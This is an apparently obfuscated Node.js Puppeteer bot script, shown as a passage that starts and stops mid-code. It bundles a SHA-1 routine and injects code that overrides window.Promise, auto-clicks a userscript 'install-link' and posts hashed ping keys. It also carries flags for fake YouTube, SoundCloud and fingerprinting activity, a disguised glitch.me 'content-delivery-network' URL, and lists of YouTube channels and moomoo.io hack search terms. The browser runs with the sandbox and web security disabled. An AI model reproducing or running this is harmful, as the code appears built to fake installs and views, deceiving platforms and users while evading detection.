                J[0x21c + -0x1e97 * -0x1 + -0x20a3] = this['block'], J[K >> -0x2 * -0x100a + -0x1 * -0xdae + -0xc * 0x3d0] |= x[0x49 * -0x72 + 0x120 + 0x1f65 & K], this['block'] = J[0x65 * 0x9 + 0x21c4 * -0x1 + 0x151 * 0x17], K >= 0x9ab + 0xd5 + 0xa48 * -0x1 && (this['hashed'] || this['hash'](), J[0x724 + 0x1355 + -0x1b * 0xfb] = this['block'], J[0x16d3 + -0x98b * 0x1 + 0x3 * -0x468] = J[0x187c + 0x3e * 0x70 + -0x339b] = J[-0x1 * -0x92b + 0xcb1 + 0x2 * -0xaed] = J[0x1ef7 + 0x1 * 0x259b + 0x1 * -0x448f] = J[0xa1c + 0x33b * 0x7 + -0x20b5] = J[-0x1 * -0x7ee + -0xfc5 * -0x1 + -0x17ae * 0x1] = J[0x33 * 0xa7 + 0xd44 + -0x93 * 0x51] = J[-0xfa7 * 0x1 + 0x1 * 0x1a5c + -0x557 * 0x2] = J[0x300 * -0xa + 0x25f0 * 0x1 + -0x7e8] = J[-0x1818 + 0x2487 * -0x1 + 0x3ca8] = J[0x1803 + 0xf69 + -0x2 * 0x13b1] = J[-0x1c7f + -0x1a6d + 0x36f7] = J[0x8c * 0xc + 0xc45 * -0x1 + -0x5c1 * -0x1] = J[0x187c + 0x705 + -0x1f74] = J[0x5 * 0x1cb + 0x16 * -0xe5 + 0xac5] = J[0x2142 + -0x3ab * 0x3 + 0x6 * -0x3b3] = 0x13fc + 0xc7b + -0x1 * 0x2077), J[-0x880 * -0x1 + 0x18a1 + 0x2113 * -0x1] = this['hBytes'] << 0x2 * -0xc61 + -0x63 * 0x34 + 0x2ce1 | this['bytes'] >>> 0x56c + 0x49 * 0x1e + -0xddd, J[0x4 * -0x312 + 0x902 + -0x1 * -0x355] = this['bytes'] << -0x217 + -0x1e8d + 0x20a7, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x16d3 + 0x1612 + -0x1 * -0xd1; J < -0x1 * 0x1dcd + 0x693 * -0x2 + -0x8a7 * -0x5; ++J)
                K = Q[J - (-0x17 * 0xb9 + -0xd0b + 0x1dad)] ^ Q[J - (-0xd6 * -0x29 + 0x1 * 0x1f71 + -0x41af)] ^ Q[J - (0x6 * -0x2c2 + -0xdbd + 0x1e57)] ^ Q[J - (-0xf71 + 0x1c5d + -0xcdc)], Q[J] = K << -0x246e + -0x1f81 + 0x43f0 | K >>> 0xa * -0x394 + -0x1669 + 0x3a50;
              for (J = -0x1030 + 0x1a76 + -0x2 * 0x523; J < -0x1 * -0x2255 + -0x3b * 0x1b + -0x1c08; J += 0x2359 + 0x113d + 0x3491 * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1db + 0x2009 + -0x1e29 | L >>> -0x1 * -0x1867 + 0x241 * 0x1 + -0x1a8d) + (M & N | ~M & O) + P + (-0x678208ce + -0x14 * 0x8f28085 + 0x174f68ccb) + Q[J] << -0x1 * 0x1547 + 0x1d * 0x12d + 0x6 * -0x223) << 0x1b0e + 0x1 * 0x1e25 + 0x1 * -0x392e | P >>> -0x241c + -0x1 * 0x1109 + 0xd5 * 0x40) + (L & (M = M << -0x17be * -0x1 + 0x8f6 + -0x2096 | M >>> -0x663 * -0x2 + -0x178 + -0x2d3 * 0x4) | ~L & N) + O + (-0x16fa0834 * -0x3 + -0xb773 * -0xa58b + 0x656 * -0xf512e) + Q[J + (0xc7 * -0x1 + -0x1 * 0xda0 + 0xe68)] << 0x1 * 0x11c8 + 0x857 + -0x1a1f) << -0x5 * 0x17 + 0x11 * 0xaf + -0xb27 | O >>> 0xd99 + 0x14d7 + 0x205 * -0x11) + (P & (L = L << -0x721 * -0x1 + 0x205a + -0xd1f * 0x3 | L >>> -0x79 * -0x3f + 0x23a + 0x1 * -0x1fff) | ~P & M) + N + (-0x6d * 0x705932 + -0x8c5c5f23 + -0xb25f3f6 * -0x19) + Q[J + (0xea8 + -0x18b4 + -0x16 * -0x75)] << -0xb * 0x2b + -0x3 * 0x8c2 + -0x17 * -0x139) << 0x79f + -0xf18 + -0x1 * -0x77e | N >>> 0xf1 * 0x24 + 0x18b3 + -0x3a7c) + (O & (P = P << 0x95a + -0x191b + 0xfdf | P >>> 0x19a6 * 0x1 + -0xa23 + -0xf81) | ~O & L) + M + (-0x7 * -0x1426fd66 + 0x21e65a * -0x2dd + 0x1 * 0x2e821b81) + Q[J + (0x2173 + 0x1 * -0xf3b + -0x1235)] << -0x8c5 + -0x13f4 + 0x1cb9) << -0x2629 + 0x1c0f + 0xa1f | M >>> -0x1170 + 0x2354 * -0x1 + 0x34df) + (N & (O = O << 0x25 * -0xe3 + 0x1 * -0xde9 + 0x1 * 0x2ed6 | O >>> -0xff9 * 0x1 + 0x8 * -0x3c6 + 0xdf * 0x35) | ~N & P) + L + (0x8e9807 * 0x45 + 0x95c299cd * -0x1 + 0xc9d61983) + Q[J + (0xc5d + -0x685 + -0x2 * 0x2ea)] << 0x5fa * 0x4 + -0x15b8 + -0x8c * 0x4, N = N << 0x1c4a + -0x1689 + -0x5a3 | N >>> -0x1 * 0x1ae0 + -0x1a03 * 0x1 + 0x34e5;
              for (; J < 0x1c9e + -0x815 * 0x3 + 0xd * -0x53; J += -0x71 * -0x47 + -0x2070 + 0xb * 0x1a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1892 + -0x3 * 0x337 + -0x4 * -0x88f | L >>> -0x107b + 0x4 * 0x32e + 0x3de) + (M ^ N ^ O) + P + (0xa5b5411a + 0xc2a7c29b + 0x4 * -0x3e60c605) + Q[J] << 0x3ad * -0x1 + 0x1c46 + -0x1 * 0x1899) << -0x5 * -0x3ea + 0x1 * -0x655 + -0xd38 | P >>> 0x1 * -0x445 + 0x6 * -0x465 + 0x1ebe) + (L ^ (M = M << 0x1ac * 0x7 + -0x3 * -0x512 + -0x6b3 * 0x4 | M >>> 0x136 * -0x10 + 0x79b + 0xbc7) ^ N) + O + (0xd0c31ac3 + 0x1 * 0xdc948732 + -0x9f3edb2a * 0x2) + Q[J + (-0x3 * 0x813 + -0x19ef + 0x3229)] << -0x21c8 + 0x871 + -0x1 * -0x1957) << -0x10f2 + -0x1f0 + 0x12e7 * 0x1 | O >>> 0xfde + -0x2412 + 0x144f) + (P ^ (L = L << 0x17e2 * -0x1 + -0x264c + 0x3e4c | L >>> -0x1cf7 + -0x1 * -0x3c2 + 0x50b * 0x5) ^ M) + N + (0x1def9834 * 0x4 + 0x1 * -0x63058ab1 + 0x6fd7 * 0xce4e) + Q[J + (0xfc8 + -0x1703 + 0x73d)] << 0x2116 + 0xb * 0x161 + -0x3041) << -0x1 * 0x80e + -0xf66 + -0x3 * -0x7d3 | N >>> -0x1 * -0x1ebb + 0x786 + -0x2626) + (O ^ (P = P << 0x65 * 0x17 + -0x1 * -0x1472 + -0x243 * 0xd | P >>> 0x67 + -0x1 * 0x1196 + 0x3 * 0x5bb) ^ L) + M + (0x6d2dde51 + 0xbf90864a + -0xbde478fa) + Q[J + (-0x146f + -0x1e2f + 0x1 * 0x32a1)] << -0x431 + -0x2225 + 0x132b * 0x2) << -0x6d8 + -0x99 * -0x15 + -0x5b0 | M >>> -0x137a + 0x1b02 + -0x76d) + (N ^ (O = O << 0x13 * -0x13c + 0x662 + 0x1130 | O >>> 0x23e6 + 0x2566 + -0x3 * 0x186e) ^ P) + L + (0x7d73538a + 0x192c4f2a + -0x27c5b713) + Q[J + (-0x5d6 + 0x1357 + -0x1 * 0xd7d)] << 0xa65 + 0xb2d * -0x1 + 0xc8, N = N << 0x9fe + -0x1197 + 0x5 * 0x18b | N >>> 0x18fa + 0x27 * 0xf + -0x1b41;
              for (; J < 0x1f * -0xab + 0x92d + 0xbc4; J += 0x4f1 * -0x2 + -0xa9d * -0x2 + 0xdf * -0xd)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x8 * -0x22d + 0x1 * -0x1ff7 + 0x26e * 0x6 | L >>> -0xbd1 + -0x2443 * 0x1 + 0x302f * 0x1) + (M & N | M & O | N & O) + P - (0xccabedc5 + 0x53a9a6f7 + -0xaf715198) + Q[J] << 0xa5b + 0x11a5 * 0x2 + -0x2da5) << 0x12c3 + -0x197e + 0x360 * 0x2 | P >>> 0x2ba * 0x2 + -0x169a + 0x1141 * 0x1) + (L & (M = M << -0xa7 * 0x1 + -0x1a24 * -0x1 + 0xf * -0x1b1 | M >>> 0x2264 + -0xe1e + -0x1444) | L & N | M & N) + O - (0x61b1f36a + 0x25eccd * -0x4ab + 0xa9 * 0x1233001) + Q[J + (0x7be + 0x2567 + -0x2d24)] << -0x1f9d * 0x1 + 0xb0f * -0x1 + -0x1 * -0x2aac) << 0x191d + -0x1b50 + 0x8e * 0x4 | O >>> -0x7e6 * -0x4 + -0xff2 + -0xad * 0x17) + (P & (L = L << -0x3c9 * -0x1 + -0x1633 + -0x4a2 * -0x4 | L >>> 0x13af + 0x1 * 0x18f1 + 0x2 * -0x164f) | P & M | L & M) + N - (-0x4 * 0x18e5d7a9 + 0x1 * -0x3a0521dd + 0x70c9 * 0x265fd) + Q[J + (-0xf8d * -0x1 + 0x1d67 + -0x2cf2)] << 0xfce + 0x132d * -0x2 + -0x1e1 * -0xc) << -0x2478 + -0xd55 + 0x31d2 | N >>> -0x1fce + 0x557 + 0x1a92) + (O & (P = P << -0x167f * 0x1 + -0x155 * 0x5 + 0x1d46 | P >>> -0x1 * 0xe11 + -0x1e5 * 0x5 + 0x2c * 0x89) | O & L | P & L) + M - (0xb74344e * 0x12 + -0x41ce0b7c * 0x2 + 0x260 * 0x1023a7) + Q[J + (-0x21f1 * -0x1 + 0x175a + -0x3948)] << 0x241a * -0x1 + 0x11fd * 0x2 + -0x10 * -0x2) << 0x1085 * 0x1 + 0x16 * -0x149 + 0xbc6 | M >>> 0x86 * 0x1f + -0x23a7 * 0x1 + 0x1388) + (N & (O = O << 0x2 * -0x1d1 + -0xd8 + 0x498 | O >>> 0xc19 + -0xe9 + -0x6a * 0x1b) | N & P | O & P) + L - (0x91dd8b * -0x32 + 0x7341e5f4 + -0xd0fd12b * -0x2) + Q[J + (-0x25a1 + -0x890 * -0x1 + 0x1d15)] << -0x103 * -0x1 + -0x169f * -0x1 + -0x17a2, N = N << -0xe8f + -0x10a0 + 0x1f4d | N >>> 0x3b4 * 0x7 + -0x3 * 0x53f + 0xa2d * -0x1;
              for (; J < 0x707 * 0x5 + 0xc5d + -0x2f30; J += -0x67 * -0x30 + -0x1 * 0x827 + -0x7c * 0x17)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x38 * -0x2a + 0x1 * 0x349 + 0x5ec | L >>> -0xd75 + -0xbbb * -0x1 + 0x1d5 * 0x1) + (M ^ N ^ O) + P - (-0x57b8dd74 + -0x659ba0b8 + 0xf2f1bc56) + Q[J] << -0x2 * -0xd1f + -0x2b * -0x52 + 0x4 * -0xa01) << 0x9 * -0x320 + 0x266 + 0x19bf | P >>> 0x9 * 0x161 + 0x6c2 * -0x5 + 0x157c) + (L ^ (M = M << -0x1fcd + 0x657 * -0x1 + 0x2642 | M >>> -0x154 + 0x17f4 + 0x5 * -0x486) ^ N) + O - (0x3 * -0x1baebd96 + -0x5d22231 + 0x8e7b991d) + Q[J + (-0x9cf + 0x974 + 0x5c)] << 0xb * -0x91 + 0x1 * 0x26 + 0x1 * 0x615) << -0x1 * 0xf4a + -0x13a0 + 0x22ef | O >>> -0x132a + 0x19cc + -0x687) + (P ^ (L = L << 0x1db9 + -0xc4d * -0x1 + -0x29e8 | L >>> 0x5e7 + 0xd1 * -0x1d + 0x11c8) ^ M) + N - (-0x1fbeaaad + 0x1b8cc784 + -0x23 * -0x1a6d511) + Q[J + (0x1c19 * 0x1 + -0x1545 + -0x6d2)] << -0x13 * -0x20c + -0x43f + 0x22a5 * -0x1) << -0x24df * 0x1 + -0x217 * 0xd + 0x400f | N >>> 0x737 + 0x16 * 0x91 + -0x1392) + (O ^ (P = P << -0x176b + 0x261b + -0xe92 | P >>> 0x142e + -0x749 * -0x1 + -0x1b75) ^ L) + M - (0x1ed0c96b + -0x31dd4a37 + -0x8d37 * -0x83ba) + Q[J + (-0x15ee + 0x8 * 0x1dc + 0x711)] << -0x19d + 0x1 * -0xeef + -0x1 * -0x108c) << 0xa4 + 0x1a * -0x14b + 0x1 * 0x20ff | M >>> 0x14 * -0x3d + -0x192c + 0x1e0b) + (N ^ (O = O << -0xd * 0x15d + -0x935 * -0x3 + 0x1 * -0x9c8 | O >>> -0x56e * 0x4 + -0x20 * -0x25 + -0x2 * -0x88d) ^ P) + L - (0x1977ae5c + 0x2a01c17b * 0x2 + 0x8ada98 * -0x67) + Q[J + (-0xacf * -0x1 + -0x406 * 0x2 + -0x2bf)] << -0x45f + 0x223 + -0x11e * -0x2, N = N << 0x1 * 0x1046 + -0x4c + -0xfdc | N >>> -0x2 * -0x556 + 0x41 * -0x65 + 0xefb;
              this['h0'] = this['h0'] + L << 0x1 * 0x22f7 + 0xcfe + 0x1 * -0x2ff5, this['h1'] = this['h1'] + M << -0x23e6 + 0xe91 + -0x7f * -0x2b, this['h2'] = this['h2'] + N << -0xd * -0x51 + -0x80 * -0x37 + -0x1f9d, this['h3'] = this['h3'] + O << 0x1dab + 0x1b5 * -0xd + 0x2 * -0x3bd, this['h4'] = this['h4'] + P << -0x1775 + -0x491 + 0x11 * 0x1a6;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x7 * 0x2ce + 0xa0a + -0x114 * -0x9 & -0x4 * -0x61d + 0xc * 0xf2 + 0x23bd * -0x1] + w[J >> -0x2534 + -0xa1e + -0x6c6 * -0x7 & -0x1bb * 0x3 + 0x41 * -0x86 + -0x1c9 * -0x16] + w[J >> 0xaf3 * 0x1 + -0x1ed * 0x5 + -0x13e & -0x8b9 + -0x1f * -0xe + 0x716] + w[J >> -0x1024 * -0x2 + 0x5 * 0x392 + -0x3212 & -0xf23 + -0xd1 * 0x23 + 0x2bc5] + w[J >> 0xc * -0xec + -0x74f + -0x1 * -0x126b & 0x4 * 0xd3 + -0x4 * 0x455 + 0x1 * 0xe17] + w[J >> 0x5 * 0x11e + -0x6c5 * 0x3 + 0xec1 & -0x176e + -0xd7 * -0x13 + -0x788 * -0x1] + w[J >> 0x1221 + -0xa85 * -0x3 + -0xb * 0x484 & 0x4 * 0x1bb + -0x20e4 + -0x1a07 * -0x1] + w[-0x838 + -0xbe4 + -0x3 * -0x6b9 & J] + w[K >> -0xcd8 + -0x694 + 0x1388 & 0x1821 + 0x464 + -0x1c76] + w[K >> -0x344 * 0x8 + 0x1 * -0x24b5 + 0x3eed & 0x16cd + 0x1 * -0x1a35 + -0x1 * -0x377] + w[K >> 0x19e7 + 0x9 * -0x3c3 + 0x808 & -0x4c9 + 0x1112 + -0xc3a] + w[K >> 0x1 * 0x1fdf + 0x1833 + -0x3802 & -0x1adb + 0x11d3 * -0x2 + 0x3e90] + w[K >> 0x7 * -0x2db + 0x1 * -0x260e + 0x3 * 0x135d & -0x55a * -0x1 + 0x1b48 + -0x2093] + w[K >> 0x20d7 + 0x2223 * 0x1 + -0x1a2 * 0x29 & -0x76b + 0x2142 * -0x1 + -0x4f * -0x84] + w[K >> -0x4b * -0x1a + -0x7 * -0x147 + -0x108b & 0x1c77 + 0xce1 * -0x1 + -0xf87] + w[0x1030 + 0x600 + 0x203 * -0xb & K] + w[L >> 0x1470 + -0x11 * -0x95 + -0x1e39 & -0x21e5 + 0x7b * 0x7 + 0x1e97] + w[L >> -0x23ae + -0x27 * -0x35 + 0x1 * 0x1bb3 & -0x240e + -0x907 + -0x12 * -0x282] + w[L >> -0xe27 + 0x21b8 + 0x137d * -0x1 & -0x1770 + 0xe * -0x86 + -0x1ed3 * -0x1] + w[L >> -0x14b + 0x469 * 0x1 + -0x30e & 0x187e + 0xc * 0x1fd + -0x304b] + w[L >> -0xd05 * -0x1 + -0xa47 * 0x3 + -0xfe * -0x12 & 0x25c6 + -0x13 * -0x61 + -0x2cea] + w[L >> -0x257e + -0x2b4 * 0x8 + -0x2 * -0x1d93 & -0xb63 * 0x1 + 0x10 * -0x112 + -0x4c3 * -0x6] + w[L >> -0x25ee + 0x529 + 0x4af * 0x7 & -0x180 * 0x2 + 0x645 + -0x336] + w[-0x43 * 0x8a + 0x2141 + 0x2ec & L] + w[M >> -0x107 * 0x1 + 0x335 * -0xc + -0x1b9 * -0x17 & 0x1bd3 + -0x8 * 0x22d + -0x4 * 0x297] + w[M >> 0x2 * 0x3d8 + -0x1021 * 0x1 + -0x17 * -0x5f & -0x1158 * 0x1 + -0xde + -0x617 * -0x3] + w[M >> 0x2 * 0x12c5 + 0x41 * -0x3 + -0x24b3 & -0x248d * 0x1 + -0x18b6 + 0x14e * 0x2f] + w[M >> 0x4 * -0x5e0 + 0x1dfc + -0x66c & -0x8c7 + 0x134b + -0xa75] + w[M >> -0x4dc + 0x16 * 0x60 + -0x358 & 0x1f88 + -0x1147 * 0x1 + -0xe32] + w[M >> -0x1 * 0xde5 + -0x11 * 0x8f + -0x1 * -0x176c & 0x13ee + -0xe12 + -0xf * 0x63] + w[M >> -0x2309 + -0x4 * -0x716 + 0x6b5 * 0x1 & -0x26aa + -0xb9d + 0x3256] + w[-0x3 * -0xa57 + 0x1a56 + -0x394c & M] + w[N >> -0x40 * 0x7e + 0xfe4 + 0x3ee * 0x4 & -0xb3 * -0x17 + 0x499 + -0x149f] + w[N >> -0x5 * 0x6b1 + -0x247 + -0x4 * -0x8f5 & 0x672 * 0x1 + -0x5 * 0x421 + 0xe42] + w[N >> 0x35 * 0x73 + 0x5a * 0x21 + -0x1 * 0x2355 & 0xff + -0xb41 * 0x2 + 0x1592] + w[N >> 0x1618 + 0x22ea + -0x38f2 & -0x1751 + 0xa4a + 0xa * 0x14f] + w[N >> 0x6a * -0x3 + -0x7a8 + 0x8f2 & -0x1 * -0x12ef + 0x1 * 0x1907 + -0x1 * 0x2be7] + w[N >> 0x1cc9 * -0x1 + 0x17 * -0xd4 + -0x2fdd * -0x1 & 0x31e * 0xc + -0xe4a + -0x170f] + w[N >> 0x14b3 + 0x86b * -0x4 + 0xcfd & -0x12cd * 0x1 + 0x817 + 0xac5] + w[-0x16fb + -0x262e + 0x3d38 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x2665 + -0x1318 * -0x1 + 0xf * 0x14b & 0x1 * 0x22b4 + -0x5 * -0xca + -0x25a7,
                J >> -0x1 * -0x10a9 + -0x639 * 0x3 + 0x212 & -0x1f * -0xb2 + -0x2571 + -0x2 * -0x871,
                J >> -0x2621 + 0xeac + 0x177d & 0x2ad + 0x4 * -0x72b + -0xa * -0x2b3,
                -0x1a42 + -0x1b4e + 0x368f & J,
                K >> -0x1 * -0xac + -0x12d7 + 0x55 * 0x37 & 0x1150 * -0x1 + 0x2ac + 0xfa3,
                K >> 0x232f + 0x1e75 + -0x1 * 0x4194 & 0x41b * -0x5 + -0x17b4 + 0x676 * 0x7,
                K >> 0x866 + -0x15fc + 0xf9 * 0xe & 0xb * -0x56 + -0x525 * -0x4 + 0x53 * -0x31,
                -0x1 * 0x17db + -0x84b + 0x2125 & K,
                L >> -0x4 * -0x2d9 + 0x2 * 0xb89 + -0x225e & 0x1df8 + 0x1 * -0xef9 + -0x2 * 0x700,
                L >> 0x8be + 0x237f + -0x1 * 0x2c2d & -0x1 * 0x1733 + 0xac5 * 0x1 + -0x1eb * -0x7,
                L >> 0xdc3 + -0x6ad * -0x4 + 0xb * -0x3ad & 0x23d * -0x1 + -0xb * -0x67 + -0x131,
                0x1d04 + 0x3 * 0x571 + -0x2c58 & L,
                M >> 0x131f + -0xa2f + -0x8d8 & -0x4 * 0x10c + 0x6d3 * -0x5 + 0x3 * 0xd1a,
                M >> -0x24a1 + 0x4 * 0x93a + -0x5 * 0xb & -0x192 + 0x1 * -0xbf + 0xd4 * 0x4,
                M >> 0x4 * -0x887 + 0x93e + 0x18e6 & -0x989 * -0x2 + 0x2 * 0x2ce + -0x17af * 0x1,
                -0x1df5 + 0x4 * -0x12a + 0x239c & M,
                N >> -0x8e * 0x1 + 0x1663 * -0x1 + 0x1709 * 0x1 & 0x24da * -0x1 + 0x2564 + -0xd * -0x9,
                N >> 0x5 * 0x152 + 0xacb * 0x3 + -0x26eb & 0xfe7 + -0x1 * 0xa81 + 0x17 * -0x31,
                N >> -0x90 + 0x1a70 + -0x19d8 & -0x1d7f + 0x44 * -0xd + 0x21f2,
                0xa6e + -0x1 * -0x1320 + -0x3 * 0x985 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x736 * -0x5 + 0x47d * -0x7 + -0x48f), (K = new DataView(J))['setUint32'](-0x359 * 0xb + 0x1 * -0x12d1 + 0x37a4, this['h0']), K['setUint32'](0x3 * -0x78a + -0x702 + -0x2 * -0xed2, this['h1']), K['setUint32'](0x1efd + 0x1 * 0x1d87 + -0x3c7c, this['h2']), K['setUint32'](0xa81 * -0x3 + -0x1af * -0xd + -0x9ac * -0x1, this['h3']), K['setUint32'](-0x224d + -0x2351 + -0x6 * -0xb9d, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0xd3 + 0x1daf + 0xe6e * -0x2];
        return window['Promise'] = class extends window[V(0x17)] {
          constructor(...J) {
            let K = 0x212f + 0x9c0 + -0x2aef;
            J[0x16d * 0x11 + 0x1219 + -0x2a56]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0xf22 + 0x265 * -0x2 + 0x14 * 0xff] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x79b + -0xce + 0x1b3 * -0x4), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x2b9 * -0x2 + -0x5d * -0x39 + -0xf42;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1 * 0x1e8f + -0x1cf3 * 0x1 + 0x415e), Promise['resolve'](-0x123a * -0x1 + 0x8b8 + -0x1 * 0x1af1);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1 * 0x1957 + -0xd27 + 0x2f6 * 0xd; j < 0x24e2 * -0x1 + -0x5 * 0x246 + 0x3041; j++)
    i();
}
const NETWORK_PATIENCE = 0xda6 * 0x1 + -0x1e1 * 0x13 + 0xaa9 * 0x5 + (-0x1a41 + -0xc73 + 0x39a * 0xe) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x51a + -0x11a6 + 0xc8f) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function a() {
  const bo = [
    'catch',
    '5%BC%BA%E7',
    'vCoMALddUCk4',
    'W43dVHdcTCo+y1vIWOKF',
    'zxnVBwuTyw5Klq',
    'https://gr',
    'WQ/cHMvpBSoMW44Zmmk0',
    'AwTLieDLy2TVkq',
    'mmk3W5NcL8kGWQpdRGKSWPi',
    ')\x20AppleWeb',
    'W6NdMSolq8kaWPRdMCo0z8kr',
    'q8kbW4RdGSodiSkUW4NcR1C',
    'W71kW67cV3/cH8krW7nnxq',
    'qdwqdwqdwq',
    'hSkKwSkRyWXMWQ8YeW',
    'Mods_(MooM',
    'BwLU',
    'CxvLCNLtzwXLyW',
    'AgfJAYXTB29TBW',
    'qtCLodyLrtKLqq',
    'moomoo.io\x20',
    'qmkdWRtdGSoopCoTW7hcS3y',
    'W6b1W7hdNstdGmoQW7ingW',
    'uhjVBwLZzq',
    'TQ69QFqmbo',
    'WQeyWRZdJ2jrbMFdR1C',
    'type',
    'https://me',
    'rg/en/scri',
    'close',
    'oYbtts1bmJa1vq'
  ];
  a = function() {
    return bo;
  };
  return a();
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x118d + -0x111b * -0x2 + 0x10a9 * -0x1);
    let h = e[f];
    return h;
  }, d(b, c);
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      W(0xe, 'Mf(O') + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x22 * 0x3b + 0xaf4 + -0x12ca; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + X(0x12) + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + Y(0x14) + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + 